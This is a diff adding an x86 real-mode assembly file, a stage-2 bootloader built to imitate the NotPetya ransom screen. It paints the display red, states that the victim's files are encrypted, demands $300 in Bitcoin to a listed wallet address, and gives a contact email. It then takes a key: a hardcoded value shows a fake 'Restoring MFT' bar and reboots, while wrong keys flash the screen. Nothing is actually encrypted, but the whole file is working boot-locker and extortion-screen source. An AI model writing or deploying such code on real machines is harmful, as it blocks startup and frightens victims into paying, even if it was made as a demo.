@@ -1,0 +1,702 @@
+; stage2.asm - Stage 2 Bootloader (NotPetya Style - Full Red Screen + Loading Bar + Panic Blink)
+; Displays red background with ransomware message and password input
+; Password: 1028952853 - triggers fake loading bar then system restart
+; Wrong password - triggers panic blink effect (red-black flashing)
+
+[BITS 16]               ; Generate 16-bit code (real mode)
+[ORG 0x0000]            ; Code loaded at 0x1000:0x0000
+
+start:
+    ; Setup segments
+    cli                 ; Disable interrupts
+    mov ax, 0x1000      ; Segment 0x1000
+    mov ds, ax          ; Data segment
+    mov es, ax          ; Extra segment
+    mov ss, ax          ; Stack segment
+    mov sp, 0xFFFE      ; Stack pointer
+    sti                 ; Enable interrupts
+    
+    ; Set video mode to 80x25 text
+    mov ax, 0x0003      ; Mode 3: 80x25 text
+    int 0x10
+    
+    ; CRITICAL: Fill ENTIRE screen including overscan area
+    ; This ensures no black borders at top/bottom
+    mov ah, 0x06        ; Scroll/clear function
+    xor al, al          ; Clear entire window
+    xor cx, cx          ; Start: row 0, col 0
+    mov dx, 0x184F      ; End: row 24, col 79
+    mov bh, 0x4F        ; White on red
+    int 0x10
+    
+    ; Set border color to red (gets rid of black border)
+    mov ah, 0x0B        ; Set border color
+    mov bh, 0x00        ; Set border color (not palette)
+    mov bl, 0x04        ; Red color
+    int 0x10
+    
+    ; Alternative: Set overscan/border register directly
+    ; This ensures the border area is also red
+    mov dx, 0x3DA       ; VGA Input Status Register
+    in al, dx           ; Reset attribute controller flip-flop
+    
+    mov dx, 0x3C0       ; Attribute controller address
+    mov al, 0x31        ; Overscan register (index 0x11, OR with 0x20 to keep display on)
+    out dx, al
+    
+    mov al, 0x04        ; Red color for overscan
+    out dx, al
+    
+    ; Re-enable video display
+    mov al, 0x20        ; Enable video
+    out dx, al
+    
+    ; Display header (row 0)
+    mov dh, 0
+    mov dl, 1
+    mov si, header_bar
+    mov bl, 0xCF        ; Bright white blinking on red
+    call print_at_pos
+    
+    ; Display separator (row 1)
+    mov dh, 1
+    mov dl, 0
+    mov si, separator_bar
+    mov bl, 0x4F
+    call print_at_pos
+    
+    ; Main title (row 3)
+    mov dh, 3
+    mov dl, 0
+    mov si, main_title
+    mov bl, 0x4E        ; Yellow on red
+    call print_at_pos
+    
+    ; Separator (row 4)
+    mov dh, 4
+    mov dl, 0
+    mov si, separator_bar
+    mov bl, 0x4F
+    call print_at_pos
+    
+    ; Paragraph 1 (rows 6-9)
+    mov dh, 6
+    mov dl, 0
+    mov si, para1_line1
+    mov bl, 0x4F
+    call print_at_pos
+    
+    mov dh, 7
+    mov dl, 0
+    mov si, para1_line2
+    mov bl, 0x4F
+    call print_at_pos
+    
+    mov dh, 8
+    mov dl, 0
+    mov si, para1_line3
+    mov bl, 0x4F
+    call print_at_pos
+    
+    mov dh, 9
+    mov dl, 0
+    mov si, para1_line4
+    mov bl, 0x4F
+    call print_at_pos
+    
+    ; Paragraph 2 (rows 11-12)
+    mov dh, 11
+    mov dl, 0
+    mov si, para2_line1
+    mov bl, 0x4F
+    call print_at_pos
+    
+    mov dh, 12
+    mov dl, 0
+    mov si, para2_line2
+    mov bl, 0x4F
+    call print_at_pos
+    
+    ; Instructions (row 14)
+    mov dh, 14
+    mov dl, 0
+    mov si, instructions_header
+    mov bl, 0x4F
+    call print_at_pos
+    
+    ; Instruction 1 (row 16)
+    mov dh, 16
+    mov dl, 0
+    mov si, instruction1
+    mov bl, 0x4F
+    call print_at_pos
+    
+    ; Bitcoin address (row 18)
+    mov dh, 18
+    mov dl, 3
+    mov si, bitcoin_address
+    mov bl, 0x4E
+    call print_at_pos
+    
+    ; Instruction 2 (rows 20-21)
+    mov dh, 20
+    mov dl, 0
+    mov si, instruction2_line1
+    mov bl, 0x4F
+    call print_at_pos
+    
+    mov dh, 21
+    mov dl, 3
+    mov si, instruction2_line2
+    mov bl, 0x4F
+    call print_at_pos
+    
+    ; Key prompt (row 23)
+    mov dh, 23
+    mov dl, 0
+    mov si, key_prompt_line1
+    mov bl, 0x4F
+    call print_at_pos
+    
+    ; "Key: " prompt (row 24)
+    mov dh, 24
+    mov dl, 0
+    mov si, key_prompt_line2
+    mov bl, 0x4F
+    call print_at_pos
+    
+    ; Position cursor after "Key: "
+    mov dh, 24
+    mov dl, 5
+    mov ah, 0x02
+    mov bh, 0x00
+    int 0x10
+    
+    ; Show blinking cursor
+    mov ah, 0x01
+    mov cx, 0x0607
+    int 0x10
+    
+    ; Initialize password buffer
+    xor si, si
+    
+; ============================================================================
+; Password input loop
+; ============================================================================
+password_input:
+    ; Wait for keypress
+    mov ah, 0x00
+    int 0x16
+    
+    ; Check for Enter
+    cmp al, 13
+    je check_password
+    
+    ; Check for Backspace
+    cmp al, 8
+    je handle_backspace
+    
+    ; Check buffer full
+    cmp si, 20
+    jge password_input
+    
+    ; Check printable character
+    cmp al, 32
+    jl password_input
+    cmp al, 126
+    jg password_input
+    
+    ; Store character
+    mov [password_buffer + si], al
+    inc si
+    
+    ; Display asterisk
+    mov ah, 0x0E
+    mov al, '*'
+    mov bh, 0x00
+    mov bl, 0x4F
+    int 0x10
+    
+    jmp password_input
+
+handle_backspace:
+    cmp si, 0
+    je password_input
+    
+    dec si
+    
+    ; Move cursor back
+    mov ah, 0x03
+    mov bh, 0x00
+    int 0x10
+    
+    dec dl
+    mov ah, 0x02
+    int 0x10
+    
+    ; Erase character
+    mov ah, 0x0A
+    mov al, ' '
+    mov cx, 1
+    int 0x10
+    
+    jmp password_input
+
+; ============================================================================
+; Check password
+; ============================================================================
+check_password:
+    ; Null-terminate
+    mov byte [password_buffer + si], 0
+    
+    ; Compare
+    mov si, password_buffer
+    mov di, correct_password
+    mov cx, 11
+    
+compare_loop:
+    mov al, [ds:si]
+    mov bl, [ds:di]
+    cmp al, bl
+    jne wrong_password
+    
+    test al, al
+    jz password_correct
+    
+    inc si
+    inc di
+    loop compare_loop
+
+password_correct:
+    ; Clear line 24 (remove password input)
+    mov dh, 24
+    mov dl, 0
+    call clear_line
+    
+    ; Display loading bar initial text: "Restoring MFT: ["
+    mov dh, 24
+    mov dl, 0
+    mov si, loading_text
+    mov bl, 0x4F        ; White on red
+    call print_at_pos
+    
+    ; Position cursor after "Restoring MFT: ["
+    ; "Restoring MFT: [" = 16 characters
+    mov dh, 24
+    mov dl, 16
+    mov ah, 0x02
+    mov bh, 0x00
+    int 0x10
+    
+    ; Loop to draw 20 '#' characters with delay
+    mov cx, 20          ; Draw 20 hash marks
+    
+loading_loop:
+    push cx             ; Save counter
+    
+    ; Draw one '#' character in yellow
+    mov ah, 0x09        ; Write character with attribute
+    mov al, '#'         ; Hash character
+    mov bh, 0x00        ; Page 0
+    mov bl, 0x4E        ; Yellow on red
+    push cx
+    mov cx, 1           ; Write 1 character
+    int 0x10
+    pop cx
+    
+    ; Move cursor to next position
+    mov ah, 0x03        ; Get cursor position
+    mov bh, 0x00
+    int 0x10            ; Returns DH=row, DL=col
+    
+    inc dl              ; Move to next column
+    mov ah, 0x02        ; Set cursor position
+    int 0x10
+    
+    ; Delay 100ms (100,000 microseconds) using BIOS interrupt
+    ; 100,000 = 0x0186A0
+    mov ah, 0x86        ; BIOS wait function
+    mov cx, 0x0001      ; High word of microseconds (1)
+    mov dx, 0x86A0      ; Low word of microseconds (34464)
+    int 0x15            ; Call BIOS wait
+    
+    pop cx              ; Restore counter
+    loop loading_loop   ; Repeat for all 20 characters
+    
+    ; Display closing bracket and completion text: "] 100% Done!"
+    mov dh, 24
+    mov dl, 36          ; After 20 hash marks (16 + 20 = 36)
+    mov si, loading_complete
+    mov bl, 0x4E        ; Yellow on red
+    call print_at_pos
+    
+    ; Final delay 2 seconds (2,000,000 microseconds) before restart
+    ; 2,000,000 = 0x1E8480
+    mov ah, 0x86        ; BIOS wait function
+    mov cx, 0x001E      ; High word (30 decimal)
+    mov dx, 0x8480      ; Low word (33920 decimal)
+    int 0x15            ; Wait 2 seconds
+    
+    ; Restart system via keyboard controller
+    mov al, 0xFE        ; Reset command
+    out 0x64, al        ; Send to keyboard controller
+    
+    ; Triple fault fallback (if keyboard controller fails)
+    cli
+    lidt [null_idt]
+    int 3
+
+; ============================================================================
+; Wrong password handler - PANIC BLINK EFFECT!
+; ============================================================================
+wrong_password:
+    ; Hide cursor during panic effect
+    mov ah, 0x01        ; Set cursor shape
+    mov cx, 0x2000      ; Hide cursor (bit 5 set)
+    int 0x10
+    
+    ; PANIC BLINK EFFECT: Flash screen 6 times (red-black-red-black...)
+    mov cx, 6           ; 6 blinks total
+    
+panic_blink_loop:
+    push cx             ; Save blink counter
+    
+    ; ===== PHASE 1: Turn screen BLACK (panic!) =====
+    mov ah, 0x06        ; Scroll/clear function
+    xor al, al          ; Clear entire window
+    xor cx, cx          ; Start: row 0, col 0
+    mov dx, 0x184F      ; End: row 24, col 79
+    mov bh, 0x00        ; BLACK background, BLACK text (all black!)
+    int 0x10
+    
+    ; Set border to black
+    mov ah, 0x0B
+    mov bh, 0x00
+    mov bl, 0x00        ; Black
+    int 0x10
+    
+    ; Wait 100ms (fast blink for panic effect)
+    mov ah, 0x86
+    mov cx, 0x0001
+    mov dx, 0x86A0
+    int 0x15
+    
+    ; ===== PHASE 2: Turn screen RED again =====
+    mov ah, 0x06        ; Scroll/clear function
+    xor al, al          ; Clear entire window
+    xor cx, cx          ; Start: row 0, col 0
+    mov dx, 0x184F      ; End: row 24, col 79
+    mov bh, 0x4F        ; White on red (back to normal)
+    int 0x10
+    
+    ; Set border to red
+    mov ah, 0x0B
+    mov bh, 0x00
+    mov bl, 0x04        ; Red
+    int 0x10
+    
+    ; Wait 100ms
+    mov ah, 0x86
+    mov cx, 0x0001
+    mov dx, 0x86A0
+    int 0x15
+    
+    pop cx              ; Restore blink counter
+    loop panic_blink_loop
+    
+    ; After panic blink, redraw the entire screen
+    ; Set overscan back to red
+    mov dx, 0x3DA
+    in al, dx
+    mov dx, 0x3C0
+    mov al, 0x31
+    out dx, al
+    mov al, 0x04
+    out dx, al
+    mov al, 0x20
+    out dx, al
+    
+    ; Redraw all content
+    call redraw_screen
+    
+    ; Show error message on line 24
+    mov dh, 24
+    mov dl, 0
+    call clear_line
+    
+    mov dh, 24
+    mov dl, 0
+    mov si, msg_wrong
+    mov bl, 0xCE        ; Yellow blinking on red (more dramatic!)
+    call print_at_pos
+    
+    ; Delay 1.5 detik (pesan "Wrong key!" sedang tampil)
+    mov ah, 0x86
+    mov cx, 0x0016
+    mov dx, 0xE360
+    int 0x15
+    
+    ; SEKARANG BERSIHKAN BARIS 24 TOTAL
+    mov dh, 24
+    mov dl, 0
+    call clear_line     ; Memanggil fungsi baru yang sudah kita perbaiki tadi
+
+    ; Tulis ulang prompt "Key: " di baris yang sudah bersih
+    mov dh, 24
+    mov dl, 0
+    mov si, key_prompt_line2
+    mov bl, 0x4F        ; Putih di atas merah
+    call print_at_pos
+    
+    ; Taruh kursor di posisi kolom 5 (setelah "Key: ")
+    mov dh, 24
+    mov dl, 5
+    mov ah, 0x02
+    int 0x10
+
+    ; Munculkan lagi kursornya
+    mov ah, 0x01
+    mov cx, 0x0607
+    int 0x10
+    
+    xor si, si          ; Reset buffer password
+    jmp password_input  ; Balik ke input
+
+; ============================================================================
+; redraw_screen - Redraw all screen content after panic blink
+; ============================================================================
+redraw_screen:
+    pusha
+    
+    ; Header
+    mov dh, 0
+    mov dl, 1
+    mov si, header_bar
+    mov bl, 0xCF
+    call print_at_pos
+    
+    ; Separator
+    mov dh, 1
+    mov dl, 0
+    mov si, separator_bar
+    mov bl, 0x4F
+    call print_at_pos
+    
+    ; Main title
+    mov dh, 3
+    mov dl, 0
+    mov si, main_title
+    mov bl, 0x4E
+    call print_at_pos
+    
+    ; Separator
+    mov dh, 4
+    mov dl, 0
+    mov si, separator_bar
+    mov bl, 0x4F
+    call print_at_pos
+    
+    ; Paragraph 1
+    mov dh, 6
+    mov dl, 0
+    mov si, para1_line1
+    mov bl, 0x4F
+    call print_at_pos
+    
+    mov dh, 7
+    mov dl, 0
+    mov si, para1_line2
+    mov bl, 0x4F
+    call print_at_pos
+    
+    mov dh, 8
+    mov dl, 0
+    mov si, para1_line3
+    mov bl, 0x4F
+    call print_at_pos
+    
+    mov dh, 9
+    mov dl, 0
+    mov si, para1_line4
+    mov bl, 0x4F
+    call print_at_pos
+    
+    ; Paragraph 2
+    mov dh, 11
+    mov dl, 0
+    mov si, para2_line1
+    mov bl, 0x4F
+    call print_at_pos
+    
+    mov dh, 12
+    mov dl, 0
+    mov si, para2_line2
+    mov bl, 0x4F
+    call print_at_pos
+    
+    ; Instructions
+    mov dh, 14
+    mov dl, 0
+    mov si, instructions_header
+    mov bl, 0x4F
+    call print_at_pos
+    
+    ; Instruction 1
+    mov dh, 16
+    mov dl, 0
+    mov si, instruction1
+    mov bl, 0x4F
+    call print_at_pos
+    
+    ; Bitcoin address
+    mov dh, 18
+    mov dl, 3
+    mov si, bitcoin_address
+    mov bl, 0x4E
+    call print_at_pos
+    
+    ; Instruction 2
+    mov dh, 20
+    mov dl, 0
+    mov si, instruction2_line1
+    mov bl, 0x4F
+    call print_at_pos
+    
+    mov dh, 21
+    mov dl, 3
+    mov si, instruction2_line2
+    mov bl, 0x4F
+    call print_at_pos
+    
+    ; Key prompt
+    mov dh, 23
+    mov dl, 0
+    mov si, key_prompt_line1
+    mov bl, 0x4F
+    call print_at_pos
+    
+    popa
+    ret
+
+; ============================================================================
+; clear_line - Clear a line on screen
+; ============================================================================
+clear_line:
+    pusha
+    mov dl, 0
+    mov ah, 0x02
+    mov bh, 0x00
+    int 0x10            ; Pindah kursor ke awal baris (DL=0)
+    
+    mov ah, 0x09        ; Fungsi tulis karakter + atribut
+    mov al, ' '         ; Karakter spasi
+    mov bh, 0x00        ; Page 0
+    mov bl, 0x4F        ; KUNCI: Paksa warna background MERAH (4) foreground PUTIH (F)
+    mov cx, 80          ; Tulis 80 kali (satu baris penuh)
+    int 0x10
+    
+    popa
+    ret
+
+; ============================================================================
+; print_at_pos - Print string at position
+; ============================================================================
+print_at_pos:
+    pusha
+    mov ah, 0x02
+    mov bh, 0x00
+    int 0x10
+    
+.loop:
+    mov al, [ds:si]
+    test al, al
+    jz .done
+    
+    mov ah, 0x09
+    mov bh, 0x00
+    mov cx, 1
+    int 0x10
+    
+    inc dl
+    mov ah, 0x02
+    int 0x10
+    
+    inc si
+    jmp .loop
+    
+.done:
+    popa
+    ret
+
+; ============================================================================
+; Data section
+; ============================================================================
+
+header_bar:
+    db '!!!WARNING!!! YOUR FILES HAVE BEEN ENCRYPTED !!!WARNING!!!', 0
+
+separator_bar:
+    db '================================================================================', 0
+
+main_title:
+    db 'Ooops, your important files are encrypted.', 0
+
+para1_line1:
+    db 'If you see this text, then your files are no longer accessible, because they', 0
+
+para1_line2:
+    db 'have been encrypted.  Perhaps you are busy looking for a way to recover your', 0
+
+para1_line3:
+    db 'files, but don', 39, 't waste your time.  Nobody can recover your files without our', 0
+
+para1_line4:
+    db 'decryption service.', 0
+
+para2_line1:
+    db 'We guarantee that you can recover all your files safely and easily.  All you', 0
+
+para2_line2:
+    db 'need to do is submit the payment and purchase the decryption key.', 0
+
+instructions_header:
+    db 'Please follow the instructions:', 0
+
+instruction1:
+    db '1. Send $300 worth of Bitcoin to following address:', 0
+
+bitcoin_address:
+    db '1Mz7153HMuxXTuR2Rit7BmGSdzaAtNbHX', 0
+
+instruction2_line1:
+    db '2. Send your Bitcoin wallet ID and personal installation key to e-mail', 0
+
+instruction2_line2:
+    db 'wesmsmith123456@posteo.net. Your personal installation key:', 0
+
+key_prompt_line1:
+    db 'If you already purchased your key, please enter it below.', 0
+
+key_prompt_line2:
+    db 'Key: ', 0
+
+loading_text:
+    db 'Restoring MFT: [', 0
+
+loading_complete:
+    db '] 100% Done!', 0
+
+msg_wrong:
+    db 'Wrong key! Try again...', 0
+
+correct_password:
+    db '1028952853', 0
+
+password_buffer:
+    times 21 db 0
+
+null_idt:
+    dw 0
+    dd 0
+
+times 5120-($-$$) db 0
